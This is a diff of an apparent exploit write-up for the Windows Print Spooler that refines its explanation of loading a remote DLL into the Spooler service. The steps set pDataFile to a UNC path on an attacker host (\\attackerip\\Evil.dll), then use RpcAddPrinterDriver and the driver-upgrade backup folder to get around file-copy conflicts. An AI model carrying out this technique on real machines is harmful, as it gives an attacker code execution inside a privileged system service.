@@ -78,13 +78,13 @@ But the real attack is not that simple. To exploit the authentication bypass bug
 
 ​	pConfigFile = A.dll
 
-​	pDataFile =\\attackerip\\Evil.dll
+​	pDataFile =   B.dll   \\attackerip\\Evil.dll
 
-​	pDriverPath=C.dll
+​	pDriverPath = C.dll
 
  
 
-It will copy A,B and C into folder C:\Windows\System32\spool\drivers\x64\3\new. And then it will copy them to C:\Windows\System32\spool\drivers\x64\3, and load C:\Windows\System32\spool\drivers\x64\3\A.dll and C:\Windows\System32\spool\drivers\x64\3\C.dll into the Spooler service. However, in the latest version, Spooler will check to make sure that A and C are local files. But as B can be an remote UNC path, so we can set pDataFile as an UNC path (an evildll). This will make our evildll Evil.dll be copied into C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. Then call RpcAddPrinterDriver again, to set pConfigFile to be C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. It will load our evil dll. Unfortunate, it does not work. Because if you set A, B, C in the folder C:\Windows\System32\spool\drivers\x64\3\. There will be an access conflict in file copy. To bypass this, we need to use the backup feature of driver upgrade. If we upgrade some driver, the old version will be backup into C:\Windows\System32\spool\drivers\x64\3\old\1\ folder. Then we can bypass the access conflict and success inject our evil.dll into spooler service. 
+It will copy A,B and C into folder C:\Windows\System32\spool\drivers\x64\3\new. And then it will copy them to C:\Windows\System32\spool\drivers\x64\3, and load C:\Windows\System32\spool\drivers\x64\3\A.dll and C:\Windows\System32\spool\drivers\x64\3\C.dll into the Spooler service. However, in the latest version, Spooler will check to make sure that A and C are local files, so we cannot copy a remote file A,C into victim system and load it directly. But as B can be an remote UNC path, so we can set pDataFile as an UNC path (an evildll). This will make our evildll Evil.dll be copied from attacker's server to victim's system and save into C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. Then call RpcAddPrinterDriver again, to set pConfigFile to be C:\Windows\System32\spool\drivers\x64\3\ Evil.dll. It will load our evil dll. Unfortunately, it does not work. Because if you set A, B, C in the folder C:\Windows\System32\spool\drivers\x64\3\. There will be an access conflict in file copy. To bypass this, we need to use the backup feature of driver upgrade. If we upgrade some driver, the old version will be backup into C:\Windows\System32\spool\drivers\x64\3\old\1\ folder. Then we can bypass the access conflict and success inject our evil.dll into spooler service. 
 
 Successfully load our dll:
 
